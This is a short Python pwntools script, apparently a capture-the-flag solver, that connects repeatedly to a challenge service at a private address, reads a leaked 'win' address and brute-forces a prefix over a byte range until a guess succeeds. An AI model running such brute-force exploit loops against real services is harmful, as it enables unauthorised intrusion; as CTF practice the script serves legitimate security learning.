from pwn import *

# p = process("./chall")

for byte in range(0x385c,0xffff):
    p = remote("10.212.138.23", 59681)

    p.recvuntil(b"0x")
    win = int("0x"+p.recvline().strip().decode(), 16)
    log.success(f"{hex(win)=}")

    guess = hex(byte)[2:] + hex(win)[2:]
    print(guess)

    p.recvline()
    p.sendline(guess.encode())
    try:
        print(p.recv())
        exit()
    except:
        p.close()

